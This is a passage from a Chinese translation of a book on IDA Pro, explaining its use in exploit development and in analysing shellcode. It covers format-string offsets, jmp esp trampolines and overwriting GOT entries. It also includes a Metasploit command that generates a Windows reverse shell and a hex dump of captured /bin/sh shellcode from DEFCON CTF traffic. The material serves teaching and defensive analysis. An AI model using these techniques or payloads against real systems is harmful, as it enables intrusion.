   -00000126                 db ? ; undefined  
   -00000125                 db ? ; undefined  
➋ -00000124                 db ? ; undefined  
   -00000123                 db ? ; undefined  
   -00000122                 db ? ; undefined  
   -00000121                 db ? ; undefined  
   -00000120                 db ? ; undefined  
   -0000011F                 db ? ; undefined  
   -0000011E                 db ? ; undefined  
   -0000011D                 db ? ; undefined  
   -0000011C                 db ? ; undefined  
   -0000011B                 db ? ; undefined  
   -0000011A                 db ? ; undefined  
   -00000119                 db ? ; undefined  
   -00000118 s1              dd ?                    ; offset  
   -00000114 stream          dd ?                    ; offset  
   -00000110 format          db 264 dup(?)
帧偏移量 128h
 到119h
 中的16 个未定义的字节表示编译器（此例中为 gcc）为传递给将由该易受攻击的函数调用的函数的参数预分配的内存块。fprintf
 的stream
 参数将位于栈的顶部（➊），格式化字符串指针则紧跟在 stream
 参数的后面（➋）。
在格式化字符串入侵程序中，攻击者通常对从格式化字符串指针到保存攻击者的输入的缓冲区开头位置之间的距离感兴趣。在上一个栈帧中，有 16 个字节将格式化字符串参数与具体的格式化字符串缓冲区分隔开来。为进行深入讨论，我们假设攻击者已输入以下格式化字符串。
"%x %x %x %x %x"
这时，fprintf
 期待在格式化字符串参数后紧跟 5 个参数。这些参数中的前四个参数将占用格式化字符串参数与格式化字符串缓冲区之间的空间，第五个参数（也就是最后一个参数）将覆盖格式化缓冲区的前四个字节。熟悉格式化字符串入侵程序2
 的读者知道，格式化字符串中的参数可以按照索引号显式命名。下面的格式化字符串说明了如何访问上述格式化字符串之后的第五个参数，以将其格式化为十六进制值。
2. 希望了解格式化字符串入侵程序的详细信息的读者，可以再次参阅Jon Erickson 的Hacking:The Art of Exploitation Second Edition
 版。
"%5$x"
再回到上一个示例，这个格式化字符串会将格式化字符串缓冲区的前四个字节[ 前面我们提到，这些字节将占用传递给格式化字符串（如果需要一个格式化字符串）的第五个参数的空间]读取为一个整数，将该整数格式化为十六进制值，然后将结果输出到指定的文件流。传递给该格式化字符串的其他参数（第六个、第七个等）将覆盖格式化字符串缓冲区中的后续四字节代码块。
创建一个能够正常运行的格式化字符串，以对易受攻击的二进制文件加以利用，可能非常麻烦，并且这通常依赖于是否准确指定格式化字符串中的参数。前面的讨论说明，在许多时候，IDA可用于快速准确地计算格式化字符串缓冲区中所需的偏移量。将这些信息与 IDA 在反汇编各种程序节（如全局偏移量表.got 或解构器表.dtor ）时显示的信息相结合，可以快速获得仅使用调试器开发入侵程序时所需的格式化字符串，而且不需要进行试用，其中也不包含任何错误。
22.3.2 定位指令序列
为了可靠地加载破解程序，你通常可以使用一种特殊的控制权转交机制，这种机制不需要你了解你的 shellcode 的具体内存地址。如果你的 shellcode 位于堆或栈中，其地址无法预测，则更需要采用这种机制。在这种情况下，如果找到一个在你的破解程序被触发时指向shellcode 的寄存器，则更加理想。例如，如果你在接管指令指针时，已知 ESI 寄存器指向你的 shellcode ，那么如果该指令指针恰巧指向一条 jmp esi
 或call esi
 指令，这将会为你提供极大的帮助。因为这些指令不需要你了解你的 shellcode 的确切地址，就可以执行 shellcode 。同样，使用 mp esp
 指令也可以非常方便地将控制权转交给你插入栈中的 shellcode 。因为如果一个函数包含易受攻击的缓冲区，当该函数返回时，栈指针将指向你刚刚覆写的被保存的返回地址下面。如果你继续覆写被保存的返回地址上面的栈，那么，栈指针将指向你的数据（应该是代码）。将指向shellcode 的寄存器与通过跳转到或调用该寄存器指向的位置来重定向执行的指令序列相结合的过程称为“trampoline”。
搜索这类指令序列并不是一个新的概念。在论文“Variations in Exploit Methods between Linux and Windows ”3
 的附录D 中，David Litchfield 介绍了一个名为 getopcode.c 的程序，这个程序用于在Linux ELF 二进制文件中搜索有用的指令。Metasploit4
 项目提供了 msfpescan
 工具，该工具可用于在 Windows PE二进制文件中扫描有用的指令序列。和这些工具一样，IDA 也能够定位有用的指令序列。
3. 参见 http://www.nccgroup.com/Libraries/Document_Downloads/Variations_in_Exploit_methods_between_Linux_and_Windows.sflb.ashx
 。
4. 参见http://www.metasploit.com/
 。
比方说，假设你希望确定一条 jmp esp
 指令在某个 x86 二进制文件中的位置。这时，你可以使用IDA 的文本搜索功能来寻找 jmp esp
 这个字符串。如果你知道 jmp
 与esp
 之间空格的确切数量，你将能够找到这个字符串。但是，任何时候你都不可能找到该字符串，因为编译器很少使用跳转到栈的命令。那么，为什么还要在第一个位置进行搜索呢？因为你真正感兴趣的并不是反汇编后的文本 jmp esp
 ，而是字节序列 FF E4
 ，不论它位于何处。例如，下面的指令包含一个内嵌的jmp esp
 ：
.text:080486CD B8 FF FF E4 34                 mov     eax, 34E4FFFFh
如果想要一个jmp esp
 ，可以使用虚拟地址080486CFh
 。IDA 的二进制搜索（Search▶Sequence of Bytes ）功能可以迅速定位这样的字节序列。如果对一个已知的字节序列执行完全匹配的二进制搜索，请记得区分大小写，否则，字节序列50 C3
 （push eax/ret
 ）将与字节序列70 C3
 相匹配（因为50h 代表大写的P ，而70h 代表小写的p ）， 70 C3
 是一个对使用-61字节的相对偏移量溢出的跳转。在IDC 中，使用FindBinary
 函数，可以通过编程执行二进制搜索，如下所示：
ea = FindBinary(MinEA(), SEARCH_DOWN | SEARCH_CASE, "FF E4");
这个函数以区分大小写的方式，从数据库中最低的虚拟地址向下（朝较高的地址）搜索 jmp esp（FF E4）
 。如果发现 jmp esp
 ，则返回该字节序列起始位置的虚拟地址。如果没有找到该字节序列，则返回 BADADDR(-1) 。读者可以在本书的网站上下载一个脚本，它能够自动搜索大量指令。使用这个脚本，我们可以搜索将控制权转交给 EDX寄存器所指位置的指令，并收到类似于下面的结果：
Searching...  
Found jmp edx (FF E2) at 0x80816e6  
Found call edx (FF D2) at 0x8048138  
Found 2 occurrences
在数据库中搜索指令时，这样的便捷脚本不但可以为我们节省大量时间，还可以确保我们不会忘记考虑到所有可能的情况。
22.3.3 查找有用的虚拟地址
我们下面将要简要提到的最后一项是 IDA 在它的反汇编代码清单中显示的虚拟地址。知道我们的shellcode 最终将进入一个静态缓冲区（例如，在.data
 或.bss
 节中），总比知道shellcode将加载到堆或栈中要强，因为我们最后可以得到一个已知的固定地址，并可以将控制权转交给这个地址。因此，我们不必使用“NOP 滑道”（NOP slide）或查找特殊的指令序列。
NOP滑道
“NOP 滑道”是一个长长的连续无操作（什么也不做）指令序列，当知道我们的 shellcode的地址可变时，它为我们提供了更广泛的目标，用以触发我们的shellcode 。现在，我们的目标不是shellcode 的第一条有用指令，而是“NOP 滑道”的中间位置。如果“NOP 滑道”（以及有效负载的剩余部分）在内存中的位置稍微向上或向下移动，我们仍然有很大机会进入“滑道”的某个位置，并成功触发 shellcode 。例如，如果我们有用于 500 个NOP 作为我们shellcode 的“前缀”的空间，那么，只要我们猜测的滑道中间的地址与真实地址之间的差距在 250 个字节以内，我们仍然能够以“滑道”的中间位置为目标，并触发我们的 shellcode 。
攻击者可以在他们选择的任何位置写入任何数据，一些破解程序则利用了这一点。许多时候，这种写入仅限于 4 字节覆写，但通常这个空间已经足够了。如果可以进行 4 字节覆写，我们可以用我们的 shellcode 的地址覆写一个函数指针。许多 ELF 二进制文件使用的动态链接过程利用一个叫做全局偏移量表
 （global offset table）的函数指针表存储动态链接的二进制函数的地址。如果攻击者能够覆写这个表中的一个条目，那么，他们就可以“劫持”一个函数调用，并将该调用重定向到他们选择的位置。通常，在这类情况下，攻击者会首先将 shellcode 放置在一个已知的位置，然后覆写将要被破解程序调用的下一个库函数的 GOT条目。当这个库函数被调用时，控制权将被转交给攻击者的 shellcode 。
在IDA 中，通过滚动到 got
 区块，并搜索我们希望覆写其条目的函数，即可轻易确定 GOT条目的地址。以尽可能自动化的方式，下面的 Python 脚本能够迅速报告将要被给定的函数调用使用的GOT条目的地址：
     ea = ScreenEA()  
     dref = ea  
     for xref in XrefsFrom(ea, 0):  
➊      if xref.type == fl_CN and SegName(xref.to) == ".plt":  
➋         for dref in DataRefsFrom(xref.to):  
              Message("GOT entry for %s is at 0x%08x\n" %   
                          (GetFunctionName(xref.to), dref))  
              break  
     if ea == dref:  
        Message("Sorry this does not appear to be a library function call\n")
将光标放置在任何库函数调用上，如下所示，这个脚本将会运行：
.text:080513A8                 call    _memset
这个脚本首先遍历交叉引用，直到到达 GOT。测试获取的第一个交叉引用（➊），以确保它是一个调用交叉引用，并且引用的是 ELF 过程链接表（.plt
 ）。PLT 条目中的代码用于读取一个GOT条目，并将控制权转交给该 GOT条目指定的地址。脚本获取的第二个交叉引用（➋）获得从PLT 中读取的位置的地址，这也是相关 GOT条目的地址。如果对前面的_memset 函数调用执行这个脚本，将生成以下输出：
GOT entry for .memset is at 0x080618d8
在我们通过“劫持”一个 memset
 函数调用来控制相关程序时，这个输出为我们提供了所需的信息，即我们需要用我们的 shellcode 的地址覆写地址 0x080618d8
 处的内容。
22.4 分析shellcode
到现在为止，本章主要讨论将 IDA 作为攻击工具的用法。在结束讨论之前，我们将至少提供一个示例，说明如何将 IDA 用作防御性工具。与任何其他二进制代码一样，要确定 shellcode的作用，只有一种办法，就是对它进行反汇编。当然，首先你必须获得一段shellcode 。如果你的好奇心较重，总是想知道 Metasploit有效负载的运行机制，那么，你只需要使用 Metasploit生成一个原始形式的有效负载，然后反汇编得到的二进制大对象（blob ）即可。
下面的Metasploit命令生成一个有效负载，它回调攻击者计算机上的 4444 端口，并为攻击者提供目标 Windows 计算机上的一个 shell ：
# ./msfpayload windows/shell_reverse_tcp LHOST=192.168.15.20 R >  
w32_reverse_4444
生成的文件包含所请求的有效负载，它为原始的二进制形式。这个文件可以在 IDA 中打开（以二进制格式，因为它没有特定的格式），并通过将显示的字节转换成代码生成一个反汇编代码清单。
另一个shellcode 可能出现的地方是网络数据包捕获（network packet capture）。要确定到底哪些数据包包含 shellcode 可能较为困难，不过，你可以查阅大量有关网络安全的书，它们会告诉你如何找到所有这些恶意数据包。现在，我们以在 DEFCON 18的“夺旗赛”网络中看到的一个重新汇编的客户端攻击数据流为例：
00000000   AD 02 0E 08  01 00 00 00  47 43 4E 93  43 4B 91 90  ........GCN.CK..  
00000010   92 47 4E 46  96 46 41 4A  43 4F 99 41  40 49 48 43  .GNF.FAJCO.A@IHC  
00000020   4A 4E 4B 43  42 49 93 4B  4A 41 47 46  46 46 43 90  JNKCBI.KJAGFFFC.  
00000030   4E 46 97 4A  43 90 42 91  46 90 4E 97  42 48 41 48  NF.JC.B.F.N.BHAH  
00000040   97 93 48 97  93 42 40 4B  99 4A 6A 02  58 CD 80 09  ..H..B@K.Jj.X...  
00000050   D2 75 06 6A  01 58 50 CD  80 33 C0 B4  10 2B E0 31  .u.j.XP..3...+.1  
00000060   D2 52 89 E6  52 52 B2 80  52 B2 04 52  56 52 52 66  .R..RR..R..RVRRf  
00000070   FF 46 E8 6A  1D 58 CD 80  81 3E 48 41  43 4B 75 EF  .F.j.X...>HACKu.  
00000080   5A 5F 6A 02  59 6A 5A 58  99 51 57 51  CD 80 49 79  Z_j.YjZX.QWQ..Iy  
00000090   F4 52 68 2F  2F 73 68 68  2F 62 69 6E  89 E3 50 54  .Rh//shh/bin..PT  
000000A0   53 53 B0 3B  CD 80 41 41  49 47 41 93  97 97 4B 48  SS.;..AAIGA...KH
很明显，这里的数据既包含 ASCII 数据，又包含二进制数据。基于与这个特殊的网络连接有关的其他数据，我们认为其中的二进制数据为 shellcode 。通常，Wireshark1
 等数据包分析工具能够将TCP 会话内容直接提取到一个文件中。在使用 Wireshark时，如果你发现一个有趣的 TCP会话，你可以使用 Follow TCP Stream（跟踪TCP 流）命令，并将原始的流内容保存到文件中。然后，再将得到的文件加载到 IDA 中（使用 IDA 的二进制加载器），继续分析。这里显示的内容是一个典型的网络攻击，其中的 shellcode 与应用程序层内容混杂在一起。为了正确反汇编这里的shellcode ，你必须正确定位攻击者的有效负载中的第一个字节。完成这个任务的困难程度因攻击而异。有时候，我们明显可以看到长长的“NOP 滑道”（x86 攻击中长长的 0x90
 序列），而在其他情况下（如当前的例子），定位 NOP ，shellcode 可能并不明显。例如，前面的十六进制数据中实际上就包含一个 NOP 滑道，但它不是真正的 x86 NOP 滑道，而是随机生成的一字节指令序列，这些指令对于随后使用的 shellcode 并无任何影响。由于这类 NOP 滑道拥有无穷数量的排列组合方式，因而网络入侵检测系统几乎很难识别这些 NOP 滑道并就此发出警告。最后，了解被攻击的应用程序有关的信息，可以帮助你区分应用程序使用的数据元素与将要执行的 shellcode 。不需要付出很大的努力，IDA 即可将前面的二进制内容反汇编成下面的代码：
1. 参见http://www.wireshark.org/
 。
➊   seg000:00000000           db 0ADh ; ¡  
   seg000:00000001           db    2  
   seg000:00000002           db  0Eh  
   seg000:00000003           db    8  
   seg000:00000004           db    1  
   seg000:00000005           db    0  
   seg000:00000006           db    0  
   seg000:00000007           db    0  
   seg000:00000008 ; -----------------------------------------------------------
   seg000:00000008           inc     edi  
   seg000:00000009           inc     ebx  
   seg000:0000000A           dec     esi  
   ...             ; NOP slide and shellcode initialization omitted  
   seg000:0000006D           push    edx  
   seg000:0000006E           push    edx  
   seg000:0000006F  